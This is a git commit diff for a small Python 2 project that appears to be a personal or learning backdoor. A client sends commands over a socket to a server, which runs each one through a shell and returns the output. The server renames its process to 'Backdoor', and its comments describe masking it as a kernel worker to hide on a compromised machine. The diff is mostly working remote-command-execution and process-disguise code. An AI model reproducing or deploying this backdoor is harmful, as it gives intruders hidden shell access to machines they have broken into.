5363d37dfe4e12672c2abb357aca5ea829c64221
E <eltonsia@yahoo.com>
2015-10-09 17:16:12 -0700

    tested some stuff

--- client.py
+++ client.py
@@ -1,20 +1,17 @@
 import socket
 
-
 #Client connects to server
-
 HOST = "127.0.0.1"
-PORT = 8506
+PORT = 8505
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 s.connect((HOST, PORT))
 
 while True:
 	command = raw_input('Write your command: ')
-	s.send(command)
+	s.sendall(command)
 
-	data = s.recv(1024)
+	data = s.recv(10240)
 
 	if data == "quit":
 		break
--- server.py
+++ server.py
@@ -1,13 +1,15 @@
+import sys
 import socket
 import subprocess
 import setproctitle
 #Change process name so that we can hide this program on a compromised machine
 #Make it look like a legitimate process running in the background
-title = "Test"
+#Usually we want to use something like kworker/2:1 to mask the program
+title = "Backdoor"
 setproctitle.setproctitle(title)
 
 HOST ="127.0.0.1"
-PORT =8506
+PORT =8505
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #s = setsockopt(socket,SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -18,15 +20,15 @@ conn, addr = s.accept()
 print "Connected with " + addr[0] + ':' + str(addr[1])
 
 while True:
-
-	data = conn.recv(1024)
+	data = conn.recv(10240)
+	#if we receive quit, we send quit back to client first then exit the program
 	if data == "quit":
 		conn.send(data)
-		break
+		sys.exit()
 	else:
 		command = data
 		process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-	
+
 		output = process.stdout.read() + process.stderr.read()
 
 		reply = output
